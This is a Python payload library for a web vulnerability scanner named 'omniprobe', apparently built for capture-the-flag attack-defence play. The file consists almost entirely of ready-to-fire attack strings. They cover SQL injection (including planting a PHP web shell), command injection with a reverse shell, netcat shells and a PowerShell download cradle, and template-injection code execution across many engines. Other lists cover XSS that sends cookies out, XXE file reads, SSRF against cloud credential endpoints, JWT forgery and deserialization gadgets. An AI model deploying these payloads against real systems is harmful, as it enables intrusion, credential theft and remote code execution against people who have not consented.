# language: Python, file: payloads.py, target: payload library for omniprobe.py
# Every payload class, maximally expanded. Sources: SecLists, PayloadsAllTheThings,
# classic public wordlists. No intelligence here — just volume + detection rules.

# ============================================================================
# SQL INJECTION — 120+ payloads
# auth bypass, union, error, blind boolean, blind time, encoding variants
# ============================================================================

SQLI = [
    # -- auth bypass classics
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR 1=1--", "' OR 1=1#",
    "\" OR \"\"=\"", "\" OR 1=1--", "\" OR '1'='1'--", "' OR ''='", "'='",
    "'OR'='", "') OR ('1'='1", "')) OR (('1'='1", "') OR ('a'='a", "' OR 'a'='a",
    "admin'--", "admin'#", "' OR 1=1", "1' OR '1'='1", "1' OR '1'='1'--",
    "1 OR 1=1", "1 OR 1=1--", "1' OR 1=1--", "1\" OR 1=1--",
    "' OR 2>1--", "' OR 2>1#", "') OR ('2'>'1", "' OR 'x'='x", "' OR 'x'='x'--",
    "a' OR 3=3--", "a' OR 3=3#", "' OR 1=1 LIMIT 1--", "' OR 1=1 LIMIT 0,1--",
    "' OR 1=1 ORDER BY 1--", "' OR 1=1 GROUP BY 1--",
    "' OR EXISTS(SELECT 1)--", "' OR EXISTS(SELECT * FROM users)--",
    "' OR (SELECT 1)=1--", "' OR (SELECT COUNT(*) FROM users)>0--",
    # -- mysql comment tricks
    "' OR 1=1/*!*/", "'/*!OR*/ 1=1", "' OR 1=1/*!50000*/",
    # -- union cascades (column count discovery)
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
    "1 ORDER BY 1--", "1 ORDER BY 2--", "1 ORDER BY 3--", "1 ORDER BY 4--",
    "1 ORDER BY 5--", "1 ORDER BY 6--", "1 ORDER BY 7--", "1 ORDER BY 8--",
    "1 ORDER BY 9--", "1 ORDER BY 10--", "1 ORDER BY 15--", "1 ORDER BY 20--",
    "1 ORDER BY 25--", "1 ORDER BY 30--", "1 ORDER BY 50--",
    "1 GROUP BY 1--", "1 GROUP BY 5--", "1 GROUP BY 10--",
    # -- union extraction
    "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
    "' UNION ALL SELECT 1,2,3--", "' UNION ALL SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT schema_name FROM information_schema.schemata--",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT version(),database(),user()--",
    "' UNION SELECT @@version,@@datadir,@@hostname--",
    "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()--",
    "' UNION SELECT load_file('/etc/passwd')--",
    "' UNION SELECT load_file('/flag')--",
    "' UNION SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
    # -- error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(1)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--",
    # -- blind boolean
    "' AND 1=1--", "' AND 1=2--", "' AND '1'='1", "' AND '1'='2",
    "1' AND '1'='1'--", "1' AND '1'='2'--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' AND SUBSTR(version(),1,1)='5'--", "' AND ASCII(SUBSTR((SELECT database()),1,1))>64--",
    # -- blind time-based
    "1' AND SLEEP(5)--", "1 AND SLEEP(5)--", "' AND SLEEP(5)--", "\" AND SLEEP(5)--",
    "1' AND SLEEP(5)#", "1' AND BENCHMARK(5000000,MD5('x'))--",
    "1 AND BENCHMARK(5000000,SHA1('x'))--",
    "' AND (SELECT SLEEP(5))--", "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
    "' || SLEEP(5)--", "'; IF(1=1,SLEEP(5),0)--",
    # -- stacked queries
    "'; SELECT 1--", "'; SELECT version()--", "1; SELECT 1--",
    "'; DROP TABLE x--", "'; INSERT INTO users VALUES('h','h')--",
    "'; WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:5'",
    "1; WAITFOR DELAY '0:0:5'--", "'; EXEC xp_cmdshell 'dir'--",
    # -- encoding / evasion
    "%27%20OR%201%3D1--", "%27%20OR%20%271%27%3D%271",
    "\x27 OR \x31\x3D\x31 --+", "'%20OR%20'1'='1",
    "'/**/OR/**/1=1--", "' /*!OR*/ 1=1", "' OR 1=1%00", "' OR 1=1 -- -",
    # -- dbms-specific version leak
    "' UNION SELECT @@version--", "' UNION SELECT version()--",
    "' UNION SELECT sqlite_version()--", "' UNION SELECT banner FROM v$version--",
    "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
    # -- postgres
    "'; SELECT * FROM pg_sleep(5)--", "' AND (SELECT pg_sleep(5))--",
    "' UNION SELECT current_database()--", "' UNION SELECT current_user--",
    "'; COPY users FROM '/etc/passwd'--",
    # -- oracle
    "' UNION SELECT NULL FROM dual--", "' AND 1=(SELECT banner FROM v$version WHERE ROWNUM=1)--",
    # -- sqlite
    "' UNION SELECT sql FROM sqlite_master--", "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
    "' AND (SELECT hex(randomblob(1000000000)))--",
]

# ============================================================================
# NoSQL INJECTION — 40+ payloads (Mongo, Couch, generic JSON)
# ============================================================================

NOSQLI = [
    "' || '1'=='1", "admin' || '1'=='1", "' || '1'=='1'--", "' || 1==1//",
    "' || 'a'=='a", "' || true //", "true, $where: '1==1'",
    "this.password.match(/.*/)//", ";return true",
    # json injection in string params
    "{\"$ne\": \"x\"}", "{\"$ne\": null}", "{\"$gt\": \"\"}", "{\"$gt\": -1}",
    "{\"$lt\": {\"$regex\": \".*\"}}", "{\"$regex\": \".*\"}", "{\"$regex\": \".*\", \"$options\": \"i\"}",
    "{\"$where\": \"1==1\"}", "{\"$or\": [{\"user\": \"admin\"}, {}]}",
    "{\"$exists\": true}", "{\"$mod\": [0, 1]}", "{\"$in\": [null, \"\"]}",
    "{\"$size\": 0}", "{\"$type\": \"string\"}", "{\"$not\": {\"$eq\": \"x\"}}",
    # operator injection via dot notation
    "user[$ne]=x&pass[$ne]=x", "user[$regex]=^a&pass[$regex]=.*",
    "user[$gt]=&pass[$gt]=", "username[$regex]=.*&password[$regex]=.*",
    # mongo shell syntax
    "' && this.password.match(/.*/i) && 'a'=='a",
    "admin' && this.password[0] == 'a",
    # blind time-ish / error probes
    "' || 1==1; //", "\" || 1==1", "1;1", "' || '' == '",
    "nosql' || '1'=='1", "x';return db.users.find(){",
    # ldap-ish (some "nosql" services are ldap)
    "*", "*)(", "*)(uid=*))", ")(uid=*))(|(uid=*",
    "admin)(&(password=*)", "*()|&'", "*)|(**",
]

# ============================================================================
# COMMAND INJECTION — 100+ payloads
# separators, wrappers, encodings, time-based, windows
# ============================================================================

CMDI = [
    # -- id / proof
    "; id", "| id", "&& id", "|| id", "\nid\n", "`id`", "$(id)",
    ";id", "|id", "& id", "&&id", "%0aid%0a", "%0Aid%0A",
    "; id;", "| id|", "&& id &&", "; id #", "| id #",
    "; cat /flag*", "| cat /flag*", "&& cat /flag*", "`cat /flag`", "$(cat /flag)",
    "; cat /flag", "; cat flag.txt", "; cat /flag.txt", "; ls /",
    "| ls /", "; ls -la /", "; ls -la .", "; ls ..", "; ls /home",
    "; cat /etc/passwd", "| cat /etc/passwd", "`cat /etc/passwd`",
    "; cat /etc/hosts", "; whoami", "| whoami", "; uname -a", "; hostname",
    "; pwd", "; ifconfig", "; ip a", "; env", "; printenv",
    # -- windows
    "& dir C:\\", "&& dir C:\\", "& type C:\\Windows\\win.ini",
    "&& type C:\\Windows\\win.ini", "| dir", "& whoami", "&& whoami",
    "& ipconfig", "& net user", "%0adir%0a",
    # -- time-based
    "; sleep 5", "| sleep 5", "&& sleep 5", "`sleep 5`", "$(sleep 5)",
    "; sleep 5 #", "& sleep 5 &", "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
    "`ping -c 3 127.0.0.1`", "; timeout 5 sleep 5",
    "; sleep$IFS5", "{sleep,5}", "; ping -n 3 127.0.0.1",
    # -- IFS / space evasion
    "; cat${IFS}/flag", "; cat$IFS/flag", ";cat${IFS}/etc/passwd",
    "; cat</flag", "; cat</etc/passwd", "; ls$IFS-la",
    "; cat$IFS$9/flag", "; wget$IFS http://127.0.0.1/",
    # -- encoding evasion
    "; echo${IFS}aWQ=|base64${IFS}-d", "; $(printf '\\151\\144')",
    "; echo id | sh", "; sh -c id", "; bash -c id",
    # -- wrappers / interpreters
    "; awk 'BEGIN{system(\"id\")}'", "; perl -e 'system(\"id\")'",
    "; python -c 'import os; os.system(\"id\")'", "; python3 -c 'import os; os.system(\"id\")'",
    "; ruby -e 'system(\"id\")'", "; node -e 'require(\"child_process\").execSync(\"id\")'",
    "; php -r 'system(\"id\");'", "; nc -e /bin/sh 127.0.0.1 4444",
    "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
    # -- quoting tricks
    "'; id", "\"; id", "'; id; '", "\"; id; \"", "' ; id",
    "\"; id", "i\"di\"d", "i'di'd", "id;#", "id #", "$(id)#",
    # -- newlines and null
    "%0aid", "%0a%0did", "%00; id", "%0a cat /flag",
    # -- powershell
    "; powershell -c id", "& powershell -c whoami",
    "; powershell IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/')",
]

# ============================================================================
# PATH TRAVERSAL / LFI / RFI — 100+ payloads
# ============================================================================

TRAVERSAL = [
    # -- etc/passwd at every depth
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
    "../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd", "../../../../../../../../../etc/passwd",
    "../etc/passwd%00", "../../../etc/passwd%00", "../../../../etc/passwd%00",
    # -- windows
    "..\\..\\..\\..\\..\\windows\\win.ini", "..\\windows\\win.ini",
    "....\\....\\....\\windows\\win.ini", "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "..%c0%af..%c0%af..%c0%afwindows/win.ini",
    # -- filter bypass encodings
    "....//....//....//etc/passwd", "....\\/....\\/....\\/etc/passwd",
    "..;/etc/passwd", "..;/..;/etc/passwd", "..;/../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd", "..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%afetc/passwd", "%c0%ae%c0%ae/etc/passwd", "%c0%ae%c0%ae%c0%afetc/passwd",
    "..%c1%9cetc/passwd", "..%ef%bc%8fetc/passwd",
    "%2e%2e/etc/passwd", ".%2e/.%2e/etc/passwd", "%2e./%2e./etc/passwd",
    # -- absolute
    "/etc/passwd", "//etc/passwd", "///etc/passwd", "/./etc/passwd",
    "file:///etc/passwd", "file://localhost/etc/passwd", "file:/etc/passwd",
    # -- flag hunting (A&D priority)
    "/flag", "/flag.txt", "../flag", "../../flag", "../../../flag", "../../../../flag",
    "../../../../../flag", "../flag.txt", "../../flag.txt", "/flags",
    "/home/flag", "/srv/flag", "/opt/flag", "/root/flag", "/tmp/flag",
    "..%2fflag", "%2fflag",
    # -- php wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=flag.php",
    "php://filter/convert.base64-encode/resource=../../../flag",
    "php://filter/resource=../../../../etc/passwd",
    "php://input", "expect://id", "data://text/plain;base64,aWQ=",
    "zip://uploads/x.jpg%23shell.php", "phar://uploads/x.jpg/shell.txt",
    # -- proc
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/fd/0",
    "/proc/version", "/etc/hostname", "/etc/hosts", "/etc/shadow", "/etc/group",
    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/etc/passwd%00.jpg",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/var/www/html/index.php", "/var/www/html/config.php",
    # -- null byte (legacy)
    "../../../etc/passwd%00.png", "../../flag%00.png",
]

RFI = [
    "http://127.0.0.1/", "http://localhost/", "//127.0.0.1/", "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/",
    "https://127.0.0.1:443/", "file:///etc/hostname", "file:///flag",
    "http://127.0.0.1:80/", "http://127.0.0.1:8080/", "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/", "http://127.0.0.1:8000/", "http://127.0.0.1:9000/",
    "http://0.0.0.0/", "http://0x7f000001/", "http://2130706433/", "http://127.1/",
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a",
]

# ============================================================================
# SSRF — 40+ payloads
# ============================================================================

SSRF = [
    "http://127.0.0.1/", "http://localhost/", "http://[::1]/", "http://0.0.0.0/",
    "http://127.1/", "http://127.0.0.1:80/", "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/", "http://127.0.0.1:5000/", "http://127.0.0.1:8000/",
    "http://127.0.0.1:9000/", "http://127.0.0.1:6379/", "http://127.0.0.1:11211/",
    "http://0x7f000001/", "http://2130706433/", "http://017700000001/",
    "http://127.0.0.1.nip.io/", "http://localtest.me/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd", "file:///flag", "file:///etc/hostname",
    "dict://127.0.0.1:6379/INFO", "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a",
    "ftp://127.0.0.1/", "tftp://127.0.0.1/",
    "http://127.0.0.1:80/admin", "http://127.0.0.1:8080/admin",
    "http://127.0.0.1:8080/actuator", "http://127.0.0.1:8080/actuator/env",
    "http://127.0.0.1:8080/debug", "http://127.0.0.1:8080/console",
    "http://127.0.0.1:9200/", "http://127.0.0.1:5432/",
    "http://127.0.0.1:3306/", "http://127.0.0.1:27017/",
]

# ============================================================================
# SSTI — 50+ payloads, every engine
# ============================================================================

SSTI = [
    # -- generic math detection
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{ 7*7 }}", "{7*7}",
    "{{7*'7'}}", "${{7*7}}", "#{7*7}", "= 7*7", " {{7*7}}",
    # -- jinja2 (python)
    "{{ config }}", "{{ config.items() }}", "{{ self }}", "{{ request }}",
    "{{ request.application }}", "{{ request.environ }}",
    "{{ ''.__class__.__mro__ }}", "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('cat /flag').read() }}",
    "{{ lipsum.__globals__ }}", "{{ lipsum.__globals__['os'].popen('cat /flag').read() }}",
    "{{ cycler.__init__.__globals__ }}", "{{ url_for.__globals__ }}",
    "{{ get_flashed_messages.__globals__ }}",
    "{{ x.__init__.__builtins__.__import__('os').popen('cat /flag').read() }}",
    "{{ dict[x=1].pop.__globals__ }}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'os' in str(x) %}{{ x.popen('cat /flag').read() }}{% endif %}{% endfor %}",
    # -- twig (php)
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}",
    "{{ ['cat /flag']|map('system') }}", "{{ ['id']|filter('system') }}",
    "{{ [0]|reduce('system','cat /flag') }}", "{{ app.request.server.get('SCRIPT_FILENAME') }}",
    # -- smarty
    "{php}system('cat /flag');{/php}", "{system('cat /flag')}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system(\"cat /flag\");?>',self::clearConfig())}",
    # -- freemarker (java)
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag\")}",
    "${\"freemarker.template.utility.Execute\"?new()(\"cat /flag\")}",
    # -- velocity
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('cat /flag'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end",
    # -- thymeleaf
    "__${T(java.lang.Runtime).getRuntime().exec('cat /flag')}__::.x",
    # -- el / spel (java spring)
    "${T(java.lang.Runtime).getRuntime().exec('cat /flag')}",
    "#{T(java.lang.Runtime).getRuntime().exec('cat /flag')}",
    "${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream()).next()}",
    # -- erb (ruby)
    "<%= system('cat /flag') %>", "<%= `cat /flag` %>",
    "<%= IO.popen('cat /flag').read() %>", "<%= eval('`cat /flag`') %>",
    # -- mako (python)
    "${__import__('os').popen('cat /flag').read()}",
    "<%import os%>${os.popen('cat /flag').read()}",
    # -- pebble
    "{% set cmd = 'cat /flag' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}",
    # -- detection-only error probes
    "{{ nonexistentvarxyz }}", "${nonexistentvarxyz}",
]

# ============================================================================
# XSS — 60+ (context detection matters more than volume, but here's volume)
# ============================================================================

XSS = [
    "<script>alert(1)</script>", "<script>fetch('http://127.0.0.1/?c='+document.cookie)</script>",
    "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "\"><svg onload=alert(1)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)", "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>", "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<form><button formaction=javascript:alert(1)>x", "<isindex action=javascript:alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
    "onmouseover=alert(1)", "\" onmouseover=alert(1) x=\"", "' onmouseover=alert(1) x='",
    "</textarea><script>alert(1)</script>", "</title><script>alert(1)</script>",
    "--><script>alert(1)</script>", "</script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=&#97;lert(1)>", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=top[/al/.source+/ert/.source](1)>",
    "{{constructor.constructor('alert(1)')()}}", "<xss id=x tabindex=1 onactivate=alert(1)></xss>",
    "<x onxxx=alert(1)>", "<a href=\"javas&#99;ript:alert(1)\">x</a>",
]

# ============================================================================
# XXE — 15 payloads
# ============================================================================

XXE = [
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag.txt\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://127.0.0.1/\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><r>&xxe;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/flag\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///proc/self/environ\">]><data>&file;</data>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % b SYSTEM \"file:///etc/passwd\"><!ENTITY x '%b;'>]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % remote SYSTEM \"http://127.0.0.1/evil.dtd\">%remote;]><r>x</r>",
    "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///flag\">]><foo>&xxe;</foo>",
]

# ============================================================================
# DESERIALIZATION — 30+ markers/gadgets
# ============================================================================

DESER = [
    "gASVAAAAAAAA",  # python pickle b64 start
    "gASVKQAAAAAAAACMAm9zlIwGZm9vdSmBhZRUsYi4=",
    "O:8:\"stdClass\":0:{}", "O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}",
    "O:4:\"User\":1:{s:4:\"name\";s:4:\"test\";}",
    "a:1:{s:4:\"test\";s:4:\"test\";}", "b:1;", "i:1;", "s:4:\"test\";",
    "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcgAAAAAAAQ",
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvcmkA",
    "ACED0005", "ACED000574001074657374",
    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"http://127.0.0.1/x\",\"autoCommit\":true}",
    "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://127.0.0.1/x\"}",
    "{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:...;\"}",
    "pyth_onpickle", "\\x80\\x04\\x95", "KFaceAA==",
    "/9j/4AAQSkZJRg==",  # jpg magic
    "PK\\x03\\x04",  # zip magic
    "GIF89a", "\\x89PNG\\r\\n\\x1a\\n",
    "{\"a\":1e999}", "{\"a\":NaN}", "{\"a\":Infinity}",
    "{\"__proto__\":{\"isAdmin\":true}}", "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
]

# ============================================================================
# LOGIC / TYPE JUGGLING — 50+
# ============================================================================

LOGIC = [
    # -- php type juggling
    "true", "false", "null", "0", "-1", "1", "[]", "{}", "[0]", "\"0\"",
    "0e0", "0e123456", "240610708", "QNKCDZO", "aabg7XSs", "0x00", "0.0",
    # -- json type
    "\"0\"", "\"true\"", "\"null\"", "\"\"", "\"0e0\"",
    # -- role/admin injection
    "admin", "administrator", "root", "test", "guest", "user", "flag",
    "true][is_admin", "{\"role\":\"admin\"}", "{\"isAdmin\":true}",
    "{\"is_admin\":true}", "{\"admin\":1}", "{\"user\":\"admin\",\"role\":\"admin\"}",
    "{\"user\":{\"role\":\"admin\"}}", "{\"id\":1}", "{\"id\":0}", "{\"id\":-1}",
    # -- numeric edge
    "NaN", "Infinity", "-Infinity", "1e999", "-1e999", "2**63", "9007199254740993",
    "4294967296", "-0", "+1", " 1", "1 ", "01", "0b1", "0o7", "1_000",
    # -- unicode/encoding tricks
    "ａｄｍｉｎ", "аdmin", "\u0061dmin",
    # -- idor probes
    "1", "2", "0", "-1", "99999", "1.0", "\"1\"", "true",
]

REDIRECT = [
    "//google.com", "https://google.com", "http://google.com",
    "//127.0.0.1:8080", "\\\\google.com", "/\\google.com",
    "https://google.com\\", "//google.com/", "///google.com",
    "http://127.0.0.1:8080//", "javascript:alert(1)", "data:text/html,x",
    "//evil.example.com", "https://google.com.evil.example.com",
    "//localhost/", "/\\/\\google.com", "https:google.com", "http:/\\/\\google.com",
]

# ============================================================================
# HEADER-BASED (tested via --header, listed here for reference)
# ============================================================================

HEADERS = [
    "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1",
    "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
    "X-Forwarded-Host: 127.0.0.1", "Host: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1", "X-Forwarded-Server: 127.0.0.1",
    "X-Host: 127.0.0.1",     "X-Forwarded-Proto: admin",
]

# ============================================================================
# XPATH INJECTION — 25+ (XML backends, XPath instead of SQL)
# ============================================================================

XPATHI = [
    "' or '1'='1", "' or ''='", "x' or 1=1 or 'x'='y", "' or count(/*)>0 or '",
    "' or string-length(name(.))=1 or '", "x' or name()='a' or 'x'='y",
    "<username>'or '1'='1</username>", "admin' or '1'='1",
    "' or 'a'='a", "' or 1=1 or ''='", "a' or '1'='1", "a' or 'a'='a",
    "' or position()=1 or '", "' or count(//node())>0 or '",
    "' or string(//user[1])='x", "' or //user[1]/*[1]='x",
    "x' or substring(//user[1]/password,1,1)='a' or 'x'='y",
    "' or contains(//user/password,'a') or '",
    "' or starts-with(//user/password,'a') or '",
    "' or //*[contains(text(),'flag')] or '",
    "' or //flag or '", "' or name(//*)='flag' or '",
    "1=1", "true()", "' or true() or '",
    "'] | //password | //user[name='", "'] | //* | //user[name='",
    "'] | //secret | //user[username='",
    "x' or doc('file:///flag')='x", "x' or document('file:///etc/passwd')='x",
]

# ============================================================================
# GRAPHQL — 25+ probes
# ============================================================================

GRAPHQL = [
    # introspection dump
    "{__schema{types{name fields{name type{name}}}}}",
    "{__schema{queryType{name}}}",
    "{__typename}",
    # common field probes
    "{users{id name email password flag}}",
    "{user(id:1){id name email password flag}}",
    "{allUsers{id name password flag}}",
    "{flag}", "{flags}", "{secret}", "{secrets}", "{admin}",
    "{getFlag}", "{getFlag(flag:true)}",
    # mutation probes
    "mutation{login(user:\"admin\",pass:\"admin\"){token}}",
    "mutation{updateUser(id:1,role:\"admin\"){id role}}",
    "mutation{createUser(name:\"x\",role:\"admin\"){id}}",
    # bypass via fragments / aliases
    "query a{f:__typename} query b{f:__schema{types{name}}}",
    # batching (DoS-ish, low priority — use with care per org rules)
    "[{__typename},{__typename}]",
    # operation name override
    "query x($a:String){user(name:$a){flag}}",
]

# ============================================================================
# JWT / TOKEN — 30+ probes (header/payload manipulations)
# ============================================================================

JWT_NONE = [
    # alg:none classic — header/payload templates; omniprobe auto-builds signed-free tokens
    "{\"alg\":\"none\"}|{\"user\":\"admin\",\"role\":\"admin\",\"isAdmin\":true}|",
    "{\"alg\":\"None\"}|{\"user\":\"admin\",\"role\":\"admin\"}|",
    "{\"alg\":\"NONE\"}|{\"user\":\"admin\"}|",
    "{\"alg\":\"nOnE\"}|{\"user\":\"admin\"}|",
    # alg confusion
    "{\"alg\":\"HS256\"}|{\"user\":\"admin\"}|secret",
    "{\"alg\":\"RS256\"}|{\"user\":\"admin\"}|x",
    "{\"alg\":\"none\",\"typ\":\"JWT\"}|{\"sub\":\"admin\",\"admin\":true}|",
    "{\"typ\":\"JWT\",\"alg\":\"none\"}|{\"user\":\"admin\",\"exp\":9999999999}|",
    # kid injection
    "{\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}|{\"user\":\"admin\"}|x",
    "{\"alg\":\"HS256\",\"kid\":\"/dev/null\"}|{\"user\":\"admin\"}|x",
    "{\"alg\":\"HS256\",\"kid\":\"key1' OR 1=1--\"}|{\"user\":\"admin\"}|x",
    "{\"alg\":\"HS256\",\"kid\":\"../../../../flag\"}|{\"user\":\"admin\"}|x",
    "{\"alg\":\"HS256\",\"jwk\":{}}|{\"user\":\"admin\"}|x",
    # jku/x5u SSRF
    "{\"alg\":\"HS256\",\"jku\":\"http://127.0.0.1/keys\"}|{\"user\":\"admin\"}|x",
    "{\"alg\":\"HS256\",\"x5u\":\"http://127.0.0.1/cert\"}|{\"user\":\"admin\"}|x",
    # claims tampering
    "{\"alg\":\"none\"}|{\"sub\":\"admin\",\"admin\":true,\"role\":\"admin\",\"iss\":\"x\",\"exp\":9999999999}|",
    "{\"alg\":\"none\"}|{\"user\":\"admin\",\"flag\":true}|",
]

# ============================================================================
# HTTP PARAMETER POLLUTION — 20+
# ============================================================================

HPP = [
    # string form (omniprobe appends as duplicate param)
    "HPP:user=admin&user=admin",  # marker entries — engine expands
    "HPP:role=user&role=admin",
    "HPP:amount=100&amount=1",
    "HPP:page=1&page=99999",
    "HPP:id=1&id=2",
    # wrapper/transfer-encoding style
    "Transfer-Encoding: chunked",
    "Content-Type: application/x-www-form-urlencoded; charset=utf-8",
    "Content-Type: multipart/form-data; boundary=x",
    "Content-Type: application/json",
    "Content-Type: text/xml",
    # json body via urlencoded field
    "{\"user\":\"admin\",\"role\":\"admin\"}",
    "{\"user\":\"admin\",\"pass\":[\"x\",\"admin'--\"]}",
    "{\"user\":{\"$ne\":\"x\"}}",
    "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}",
]

# ============================================================================
# FILE UPLOAD BYPASS — 25+ (filename/content probes)
# ============================================================================

UPLOAD = [
    # extensions
